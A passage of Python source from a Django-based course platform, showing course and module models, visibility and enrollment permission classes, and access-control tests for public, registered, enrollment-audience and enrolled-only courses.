get_student_profiles(self):\n        return self.students.all()\n\n    def get_submitted_profiles(self):\n        return UserProfile.objects.filter(submissions__exercise__course_module__course_instance=self)\\\n            .distinct()\\\n            .exclude(assisting_courses=self)\\\n            .exclude(teaching_courses=self.course)\n\n    def is_open(self, when=None):\n        when = when or timezone.now()\n        return self.starting_time <= when <= self.ending_time\n\n    def is_past(self, when=None):\n        when = when or timezone.now()\n        return self.ending_time < when\n\n    def is_on_lifesupport(self, when=None):\n        when = when or timezone.now()\n        return self.lifesupport_start < when\n\n    def is_archived(self, when=None):\n        when = when or timezone.now()\n        return self.archive_start < when\n\n    @property\n    def archive_start(self):\n        if self.archive_time: # not null\n            return self.archive_time\n        return self.ending_time + datetime.timedelta(days=365)\n\n    @property\n    def lifesupport_start(self):\n        if self.lifesupport_time: # not null\n            return self.lifesupport_time\n        return self.ending_time + datetime.timedelta(days=365)\n\n    @property\n    def enrollment_start(self):\n        return self.enrollment_starting_time or self.starting_time\n\n    @property\n    def enrollment_end(self):\n        return self.enrollment_ending_time or self.ending_time\n\n    def is_enrollment_open(self):\n        return self.enrollment_start <= timezone.now() <= self.enrollment_end\n\n    def has_enrollment_closed(self):\n        return timezone.now() > self.enrollment_end\n\n    def is_visible_to(self, user=None):\n        if self.visible_to_students:\n            return True\n        return user and self.is_course_staff(user)\n\n    @property\n    def head_css_urls(self):\n        return [url for url in self.head_urls.split() if \".css\" in url]\n\n    @property\n    def head_js_urls(self):\n        return [url for url in self.head_urls.split() if \".js\" in url]\n\n    ABSOLUTE_URL_NAME = \"course\"\n    EDIT_URL_NAME = \"course-edit\"\n\n    def get_url_kwargs(self):\n        # dict(foo=bar, **baz()) is not nice, but it's cleanest solution for this\n        # specific problem. For more read out stackoverflow answer about merging\n        # python dicts in single line: http://stackoverflow.com/a/26853961\n        return dict(instance_slug=self.url, **self.course.get_url_kwargs())\n\n\nclass CourseHook(models.Model):\n    \"\"\"\n    Provides a hook for a course instance, that is called after a certain\n    action. Currently only hook implemented is post-grading, i.e. after a\n    student submission has been successfully graded by the external service.\n\n    When a hook is triggered it will do a HTTP POST to a defined URL\n    passing along data (e.g. submission id).\n    \"\"\"\n\n    HOOK_CHOICES = (\n        (\"post-grading\", \"Post grading\"),\n    )\n\n    hook_url = models.URLField()\n    hook_type = models.CharField(max_length=12, choices=HOOK_CHOICES, default=\"post-grading\")\n    course_instance = models.ForeignKey(CourseInstance, on_delete=models.CASCADE,\n        related_name=\"course_hooks\")\n\n    def __str__(self):\n        return \"{} -> {}\".format(self.course_instance, self.hook_url)\n\n    def trigger(self, data):\n        logger = logging.getLogger(\"plus.hooks\")\n        try:\n            urllib.request.urlopen(self.hook_url,\n                urllib.parse.urlencode(data).encode('utf-8'), timeout=10)\n            logger.info(\"%s posted to %s on %s with %s\",\n                        self.hook_type, self.hook_url, self.course_instance, data)\n        except:\n            logger.error(\"HTTP POST failed on %s hook to %s (%s)\",\n                         self.hook_type, self.hook_url, self.course_instance)\n\n\nclass CourseModuleManager(models.Manager):\n    def get_queryset(self):\n        return super().get_queryset().select_related(\n            'course_instance', 'course_instance__course')\n\n    def get_visible(self, user=None):\n        if not user or not user.is_authenticated:\n            return self.filter(\n                course_instance__visible_to_students=True,\n                opening_time__lte=timezone.now(),\n            )\n        if not user.is_superuser:\n            return self.filter(\n                get_course_visibility_filter(user, 'course_instance__'),\n                opening_time__lte=timezone.now(),\n            ).distinct()\n        return self.all()\n\n\nclass CourseModule(UrlMixin, models.Model):\n    \"\"\"\n    CourseModule objects connect chapters and learning objects to logical sets\n    of each other and course instances. They also contain information about the\n    opening times and deadlines for exercises.\n    \"\"\"\n    STATUS = Enum([\n        ('READY', 'ready', _(\"Ready\")),\n        ('UNLISTED', 'unlisted', _(\"Unlisted in table of contents\")),\n        ('HIDDEN', 'hidden', _(\"Hidden\")),\n        ('MAINTENANCE', 'maintenance', _(\"Maintenance\")),\n    ])\n    status = models.CharField(max_length=32,\n        choices=STATUS.choices, default=STATUS.READY)\n    order = models.IntegerField(default=1)\n    name = models.CharField(max_length=255)\n    url = models.CharField(max_length=255,\n                       validators=[generate_url_key_validator()],\n                       help_text=_(\"Input an URL identifier for this module.\"))\n    points_to_pass = models.PositiveIntegerField(default=0)\n    introduction = models.TextField(blank=True)\n    course_instance = models.ForeignKey(CourseInstance, on_delete=models.CASCADE,\n        related_name=\"course_modules\")\n    opening_time = models.DateTimeField(default=timezone.now)\n    closing_time = models.DateTimeField(default=timezone.now)\n\n    # early_submissions_allowed= models.BooleanField(default=False)\n    # early_submissions_start = models.DateTimeField(default=timezone.now, blank=True, null=True)\n    # early_submission_bonus  = PercentField(default=0.1,\n    #   help_text=_(\"Multiplier of points to reward, as decimal. 0.1 = 10%\"))\n\n    late_submissions_allowed = models.BooleanField(default=False)\n    late_submission_deadline = models.DateTimeField(default=timezone.now)\n    late_submission_penalty = PercentField(default=0.5,\n        help_text=_(\"Multiplier of points to reduce, as decimal. 0.1 = 10%\"))\n\n    objects = CourseModuleManager()\n\n    class Meta:\n        unique_together = (\"course_instance\", \"url\")\n        ordering = ['order', 'closing_time', 'id']\n\n    def __str__(self):\n        if self.order > 0:\n            if self.course_instance.module_numbering == CourseInstance.CONTENT_NUMBERING.ARABIC:\n                return \"{:d}. {}\".format(self.order, self.name)\n            elif self.course_instance.module_numbering == CourseInstance.CONTENT_NUMBERING.ROMAN:\n                return \"{} {}\".format(roman_numeral(self.order), self.name)\n        return self.name\n\n    def clean(self):\n        super().clean()\n        errors = {}\n        RESERVED = (\"toc\", \"teachers\", \"user\", \"exercises\", \"apps\", \"lti-login\")\n        if self.url in RESERVED:\n            errors['url'] = _(\"Taken words include: {}\").format(\", \".join(RESERVED))\n        if self.opening_time > self.closing_time:\n            errors['opening_time'] = _(\"Opening time must be earlier than the closing time.\")\n        if self.late_submissions_allowed and self.late_submission_deadline <= self.closing_time:\n            errors['late_submission_deadline'] = _(\"Late submission deadline must be later than the closing time.\")\n        if errors:\n            raise ValidationError(errors)\n\n    def is_open(self, when=None):\n        when = when or timezone.now()\n        return self.opening_time <= when <= self.closing_time\n\n    def is_after_open(self, when=None):\n        \"\"\"\n        Checks if current time is past the round opening time.\n        \"\"\"\n        when = when or timezone.now()\n        return self.opening_time <= when\n\n    def is_late_submission_open(self, when=None):\n        when = when or timezone.now()\n        return self.late_submissions_allowed \\\n            and self.closing_time <= when <= self.late_submission_deadline\n\n    def is_closed(self, when=None):\n        when = when or timezone.now()\n        if self.late_submissions_allowed and self.late_submission_penalty < 1:\n            return when > self.late_submission_deadline\n        return when > self.closing_time\n\n    def are_requirements_passed(self, cached_points):\n        for r in self.requirements.all():\n            if not r.is_passed(cached_points):\n                return False\n        return True\n\n    def get_late_submission_point_worth(self):\n        \"\"\"\n        Returns the percentage (0-100) that late submission points are worth.\n        \"\"\"\n        point_worth = 0\n        if self.late_submissions_allowed:\n            point_worth = int((1.0 - self.late_submission_penalty) * 100.0)\n        return point_worth\n\n    def number_of_submitters(self):\n        return self.course_instance.students\\\n            .filter(submissions__exercise__course_module=self).distinct().count()\n\n    ABSOLUTE_URL_NAME = \"module\"\n\n    def get_url_kwargs(self):\n        return dict(module_slug=self.url, **self.course_instance.get_url_kwargs())\n\n\nclass LearningObjectCategory(models.Model):\n    \"\"\"\n    Learning objects may be grouped to different categories.\n    \"\"\"\n    STATUS = Enum([\n        ('READY', 'ready', _(\"Ready\")),\n        ('NOTOTAL', 'nototal', _(\"No total points\")),\n        ('HIDDEN', 'hidden', _(\"Hidden\")),\n    ])\n    status = models.CharField(max_length=32,\n        choices=STATUS.choices, default=STATUS.READY)\n    name = models.CharField(max_length=255)\n    description = models.TextField(blank=True)\n    points_to_pass = models.PositiveIntegerField(default=0)\n    course_instance = models.ForeignKey(CourseInstance, on_delete=models.CASCADE,\n        related_name=\"categories\")\n    confirm_the_level = models.BooleanField(default=False,\n        help_text=_(\"Once exercise is graded non zero it confirms all the points on the hierarchy level. Implemented as a mandatory feedback feature.\"))\n    accept_unofficial_submits = models.BooleanField(default=False,\n        help_text=_(\"Grade unofficial submissions after deadlines have passed or submission limits have been exceeded. The points are stored but not included in official records.\"))\n\n    #hidden_to = models.ManyToManyField(UserProfile, related_name=\"hidden_categories\",\n    #    blank=True, null=True)\n\n    class Meta:\n        unique_together = (\"name\", \"course_instance\")\n\n    def __str__(self):\n        return self.name\n\n    #def is_hidden_to(self, user_profile):\n    #    return self.hidden_to.filter(id=user_profile.id).exists()\n\n    #def set_hidden_to(self, user_profile, hide=True):\n    #    if hide and not self.is_hidden_to(user_profile):\n    #        self.hidden_to.add(user_profile)\n    #    elif not hide and self.is_hidden_to(user_profile):\n    #        self.hidden_to.remove(user_profile)\n/n/n/ncourse/permissions.py/n/nfrom django.http import Http404\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom authorization.permissions import (\n    ACCESS,\n    Permission,\n    MessageMixin,\n    ObjectVisibleBasePermission,\n    FilterBackend,\n)\nfrom exercise.cache.points import CachedPoints\nfrom userprofile.models import UserProfile\nfrom .models import (\n    CourseModule,\n    CourseInstance,\n)\n\n\nclass CourseVisiblePermission(ObjectVisibleBasePermission):\n    message = _(\"Permission denied by course visibility\")\n    model = CourseInstance\n    obj_var = 'instance'\n\n    def is_object_visible(self, request, view, course):\n        \"\"\"\n        Find out if CourseInstance is visible to user\n        We expect that AccessModePermission is checked first\n\n         - Always visible to course staff\n         - Always hidden if not open (visible_to_students)\n         - Always visible if public\n         - If not public:\n           - Require authentication\n           - If view_access == enrolled -> visible if student of the course\n           - If enrollment audience external, user should be external\n           - If enrollment audience internal, user should be internal\n        \"\"\"\n        # NOTE: course is actually course instance\n\n        # Course is always visible to staff members\n        if view.is_course_staff:\n            return True\n\n        # Course is not visible if it's hidden\n        if not course.visible_to_students:\n            self.error_msg(_(\"The resource is not currently visible.\"))\n            return False\n\n        user = request.user\n        show_for = course.view_content_to\n        VA = course.VIEW_ACCESS\n\n        # FIXME: we probably should test if access_mode is ANONYMOUS (public), but that\n        # would break api permissiosn (requires get_access_mode)\n        if show_for != VA.PUBLIC:\n            if not user.is_authenticated:\n                self.error_msg(_(\"This course is not open for public.\"))\n                return False\n\n            # Handle enroll views separately\n            if view.get_access_mode() == ACCESS.ENROLL:\n                return self.enrollment_audience_check(request, course, user)\n\n            if show_for == VA.ENROLLED:\n                if not course.is_student(user):\n                    self.error_msg(_(\"Only enrolled students shall pass.\"))\n                    return False\n\n            elif show_for == VA.ENROLLMENT_AUDIENCE:\n                return self.enrollment_audience_check(request, course, user)\n\n        return True\n\n    def enrollment_audience_check(self, request, course, user):\n        audience = course.enrollment_audience\n        external = user.userprofile.is_external\n        EA = course.ENROLLMENT_AUDIENCE\n        if audience == EA.INTERNAL_USERS and external:\n            self.error_msg(_(\"This course is only for internal students.\"))\n            return False\n        elif audience == EA.EXTERNAL_USERS and not external:\n            self.error_msg(_(\"This course is only for external students.\"))\n            return False\n        return True\n\n\nclass EnrollInfoVisiblePermission(ObjectVisibleBasePermission):\n    message = _(\"Permission denied by course visibility\")\n    model = CourseInstance\n    obj_var = 'instance'\n\n    def is_object_visible(self, request, view, course_instance):\n        # Course is always visible to staff members\n        if view.is_course_staff:\n            return True\n\n        # Course is not visible if it's hidden\n        if not course_instance.visible_to_students:\n            self.error_msg(_(\"The resource is not currently visible.\"))\n            return False\n\n        # Only public courses may be browsed without logging in.\n        if course_instance.view_content_to != course_instance.VIEW_ACCESS.PUBLIC \\\n                and not request.user.is_authenticated:\n            self.error_msg(_(\"This course is not open for public.\"))\n            return False\n\n        return True\n\n\nclass CourseModulePermission(MessageMixin, Permission):\n    message = _(\"The module is not currently visible\")\n\n    def has_permission(self, request, view):\n        if not view.is_course_staff:\n            module = view.module\n            return self.has_object_permission(request, view, module)\n        return True\n\n    def has_object_permission(self, request, view, module):\n        if not isinstance(module, CourseModule):\n            return True\n\n        if module.status == CourseModule.STATUS.HIDDEN:\n            return False\n\n        if not module.is_after_open():\n            # FIXME: use format from django settings\n            self.error_msg(\n                _(\"The module will open for submissions at {date}.\"),\n                format={'date': module.opening_time},\n                delim=' ',\n            )\n            return False\n\n        if module.requirements.count() > 0:\n            points = CachedPoints(module.course_instance, request.user, view.content)\n            return module.are_requirements_passed(points)\n        return True\n\n\nclass OnlyCourseTeacherPermission(Permission):\n    message = _(\"Only course teacher is allowed\")\n\n    def has_permission(self, request, view):\n        return self.has_object_permission(request, view, view.instance)\n\n    def has_object_permission(self, request, view, obj):\n        return view.is_teacher or request.user.is_superuser\n\n\nclass OnlyCourseStaffPermission(Permission):\n    message = _(\"Only course staff is allowed\")\n\n    def has_permission(self, request, view):\n        return self.has_object_permission(request, view, view.instance)\n\n    def has_object_permission(self, request, view, obj):\n        return view.is_course_staff or request.user.is_superuser\n\n\nclass IsCourseAdminOrUserObjIsSelf(OnlyCourseStaffPermission, FilterBackend):\n\n    def has_object_permission(self, request, view, obj):\n        if not isinstance(obj, UserProfile):\n            return True\n\n        user = request.user\n        return user and (\n            (user.id is not None and user.id == obj.user_id) or\n            super().has_object_permission(request, view, obj)\n        )\n\n    def filter_queryset(self, request, queryset, view):\n        user = request.user\n        if (\n            issubclass(queryset.model, UserProfile) and\n            not view.is_course_staff and\n            not user.is_superuser\n        ):\n            queryset = queryset.filter(user_id=user.id)\n        return queryset\n/n/n/ncourse/test_visibility_enroll.py/n/nfrom datetime import timedelta\nimport logging\n\nfrom django.contrib.auth.models import User\nfrom django.urls import reverse\nfrom django.test import TestCase\nfrom django.test.client import Client\nfrom django.utils import timezone\n\nfrom course.models import Course, CourseInstance, CourseModule, \\\n    LearningObjectCategory\nfrom exercise.exercise_models import BaseExercise, CourseChapter, LearningObject\nfrom exercise.submission_models import Submission\n\nclass CourseVisibilityTest(TestCase):\n    \"\"\"Tests for course visibility and access control.\n    There are also some tests about enrollment.\n    \"\"\"\n\n    def setUp(self):\n        self.user = User(username=\"testUser\") # not enrolled in the course\n        self.user.set_password(\"testUser\")\n        self.user.save()\n\n        self.student = User(username=\"student\") # enrolled in the course\n        self.student.set_password(\"student\")\n        self.student.save()\n\n        self.course = Course.objects.create(\n            name=\"Test course\",\n            code=\"123456\",\n            url=\"Course-Url\",\n        )\n\n        self.today = timezone.now()\n        self.tomorrow = self.today + timedelta(days=1)\n        self.two_days_from_now = self.tomorrow + timedelta(days=1)\n        self.yesterday = self.today - timedelta(days=1)\n\n        # course instances with different view_access_to settings\n        self.public_course_instance = CourseInstance.objects.create(\n            instance_name=\"Public\",\n            starting_time=self.yesterday,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"public\",\n            view_content_to=CourseInstance.VIEW_ACCESS.PUBLIC,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.INTERNAL_USERS,\n        )\n\n        self.all_regist_course_instance = CourseInstance.objects.create(\n            instance_name=\"All registered users\",\n            starting_time=self.yesterday,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"allregistered\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ALL_REGISTERED,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.INTERNAL_USERS,\n        )\n\n        self.enroll_audience_course_instance = CourseInstance.objects.create(\n            instance_name=\"Enrollment audience\",\n            starting_time=self.yesterday,\n            ending_time=self.two_days_from_now,\n            course=self.course,\n            url=\"enrollmentaudience\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLMENT_AUDIENCE,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.INTERNAL_USERS,\n        )\n\n        self.enrolled_course_instance = CourseInstance.objects.create(\n            instance_name=\"Enrolled\",\n            starting_time=self.yesterday,\n            ending_time=self.two_days_from_now,\n            course=self.course,\n            url=\"enrolled\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLED,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.INTERNAL_USERS,\n        )\n        self.course_instances = [self.public_course_instance, self.all_regist_course_instance,\n            self.enroll_audience_course_instance, self.enrolled_course_instance]\n\n        # enrollment\n        for instance in self.course_instances:\n            instance.enroll_student(self.student)\n\n        # module/exercise round for each course instance\n        self.course_modules = {}\n        for instance in self.course_instances:\n            self.course_modules[instance.id] = CourseModule.objects.create(\n                name=\"Test module\",\n                url=\"test-module\",\n                points_to_pass=10,\n                course_instance=instance,\n                opening_time=self.today,\n                closing_time=self.tomorrow,\n            )\n\n        # category\n        self.categories = {}\n        for instance in self.course_instances:\n            self.categories[instance.id] = LearningObjectCategory.objects.create(\n                name=\"Test category\",\n                course_instance=instance,\n                points_to_pass=0,\n            )\n\n        # learning objects\n        self.learning_objects = {}\n        for instance in self.course_instances:\n            lobjects = []\n            chapter = CourseChapter.objects.create(\n                name=\"Test chapter\",\n                course_module=self.course_modules[instance.id],\n                category=self.categories[instance.id],\n                url='chapter1',\n            )\n            lobjects.append(chapter)\n            lobjects.append(BaseExercise.objects.create(\n                name=\"Embedded exercise\",\n                parent=chapter,\n                status=LearningObject.STATUS.UNLISTED,\n                course_module=self.course_modules[instance.id],\n                category=self.categories[instance.id],\n                url='embedexercise',\n                max_submissions=10,\n                max_points=10,\n                points_to_pass=0,\n            ))\n            lobjects.append(BaseExercise.objects.create(\n                name=\"Normal exercise\",\n                course_module=self.course_modules[instance.id],\n                category=self.categories[instance.id],\n                url='normalexercise',\n                max_submissions=10,\n                max_points=10,\n                points_to_pass=0,\n            ))\n            self.learning_objects[instance.id] = lobjects\n\n        # submissions\n        self.submissions = {}\n        for course_instance_id, exercises in self.learning_objects.items():\n            for exercise in exercises:\n                if not exercise.is_submittable:\n                    continue\n                self.submissions[exercise.id] = []\n                submission = Submission.objects.create(\n                    exercise=exercise,\n                )\n                submission.submitters.add(self.student.userprofile)\n                self.submissions[exercise.id].append(submission)\n\n        # disable all logging\n        logging.disable(logging.CRITICAL)\n\n    def test_redirect_to_enroll(self):\n        url = self.enrolled_course_instance.get_absolute_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n\n        # unenrolled logged-in user should be redirected to the enroll page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertRedirects(response, self.enrolled_course_instance.get_url('enroll'))\n        self.client.logout()\n\n        # enrolled students should open the course front page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n\n    def test_course_home(self):\n        url = self.enroll_audience_course_instance.get_absolute_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should see the course home page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the course front page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # course instance: all registered/logged-in users may see the course\n        url = self.all_regist_course_instance.get_absolute_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should see the course home page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the course front page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # public course instance\n        url = self.public_course_instance.get_absolute_url()\n        # anonymous user should see the course front page\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        # unenrolled logged-in user should see the course home page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the course front page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # course content visible to the enrollment audience, but user is\n        # not in the enrollment audience\n        ext_instance = CourseInstance.objects.create(\n            instance_name=\"Enrollment audience external\",\n            starting_time=self.yesterday,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"extaudience\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLMENT_AUDIENCE,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.EXTERNAL_USERS,\n        )\n        url = ext_instance.get_absolute_url()\n        self.assertTrue(self.client.login(username=self.user.username, password=\"testUser\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403) # Forbidden\n        response = self.client.get(ext_instance.get_url('enroll'))\n        self.assertEqual(response.status_code, 200) # allowed to see the enrollment page\n        response = self.client.post(ext_instance.get_url('enroll'))\n        self.assertEqual(response.status_code, 403) # may not enroll\n        self.client.logout()\n\n        # course content visible to registered users (logged-in users), but user is\n        # not in the enrollment audience\n        ext_regist_instance = CourseInstance.objects.create(\n            instance_name=\"Enrollment audience external - view registered users\",\n            starting_time=self.yesterday,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"extaudience-registusers\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ALL_REGISTERED,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.EXTERNAL_USERS,\n        )\n        url = ext_instance.get_absolute_url()\n        self.assertTrue(self.client.login(username=self.user.username, password=\"testUser\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403) # Forbidden\n        response = self.client.get(ext_instance.get_url('enroll'))\n        self.assertEqual(response.status_code, 200) # allowed to see the enrollment page\n        response = self.client.post(ext_instance.get_url('enroll'))\n        self.assertEqual(response.status_code, 403) # may not enroll\n        self.client.logout()\n\n    def test_course_module(self):\n        url = self.course_modules[self.enrolled_course_instance.id].get_absolute_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should not see the module page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n        self.client.logout()\n        # enrolled students should open the course module page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # course instance: access to enrollment audience (logged-in internal users)\n        url = self.course_modules[self.enroll_audience_course_instance.id].get_absolute_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should see the module page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the course module page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # course instance: access to registered users (any logged-in users)\n        url = self.course_modules[self.all_regist_course_instance.id].get_absolute_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should see the module page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the course module page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # course instance: access to anyone (anonymous)\n        url = self.course_modules[self.public_course_instance.id].get_absolute_url()\n        # anonymous user can open the module page\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        # unenrolled logged-in user should see the module page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the course module page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # course content visible to the enrollment audience, but user is\n        # not in the enrollment audience\n        ext_instance = CourseInstance.objects.create(\n            instance_name=\"Enrollment audience external\",\n            starting_time=self.yesterday,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"extaudience\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLMENT_AUDIENCE,\n            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.EXTERNAL_USERS,\n        )\n        ext_module = CourseModule.objects.create(\n            name=\"Test module\",\n            url=\"test-module\",\n            points_to_pass=10,\n            course_instance=ext_instance,\n            opening_time=self.today,\n            closing_time=self.tomorrow,\n        )\n        url = ext_module.get_absolute_url()\n        self.assertTrue(self.client.login(username=self.user.username, password=\"testUser\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403) # Forbidden\n        self.client.logout()\n\n    def test_chapter_enrolled_only(self):\n        url = self.learning_objects[self.enrolled_course_instance.id][0].get_display_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should not see the chapter page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # chapter exercise\n        chapter_exercise = self.learning_objects[self.enrolled_course_instance.id][1]\n        url = '/Course-Url/enrolled/test-module/chapter1/embedexercise/plain/'\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should not see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # normal exercise (not inside chapter)\n        exercise = self.learning_objects[self.enrolled_course_instance.id][2]\n        url = reverse('exercise', kwargs={\n            'exercise_path': exercise.url,\n            'module_slug': exercise.course_module.url,\n            'instance_slug': exercise.course_module.course_instance.url,\n            'course_slug': exercise.course_module.course_instance.course.url,\n        })\n        self.assertEqual(url, '/Course-Url/enrolled/test-module/normalexercise/')\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should not see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n    def test_chapter_enroll_audience(self):\n        url = self.learning_objects[self.enroll_audience_course_instance.id][0].get_display_url()\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in internal user should see the chapter page\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # chapter exercise\n        chapter_exercise = self.learning_objects[self.enroll_audience_course_instance.id][1]\n        url = '/Course-Url/enrollmentaudience/test-module/chapter1/embedexercise/plain/'\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in internal user should see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the chapter page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # normal exercise (not inside chapter)\n        exercise = self.learning_objects[self.enroll_audience_course_instance.id][2]\n        url = reverse('exercise', kwargs={\n            'exercise_path': exercise.url,\n            'module_slug': exercise.course_module.url,\n            'instance_slug': exercise.course_module.course_instance.url,\n            'course_slug': exercise.course_module.course_instance.course.url,\n        })\n        self.assertEqual(url, '/Course-Url/enrollmentaudience/test-module/normalexercise/')\n        # should redirect to A+ login\n        response = self.client.get(url)\n        self.assertRedirects(response, '/accounts/login/?next=' + url)\n        # unenrolled logged-in user should see the exercise\n        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n        # enrolled students should open the exercise page normally\n        self.assertTrue(self.client.login(username=self.student.username, password=\"student\"))\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.client.logout()\n\n        # course content visible to the enrollment audience, but user is\n        # not in the enrollment audience\n        ext_instance = CourseInstance.objects.create(\n            instance_name=\"Enrollment audience external\",\n            starting_time=self.yesterday,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"extaudience\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLMENT_AUDIENCE,\n            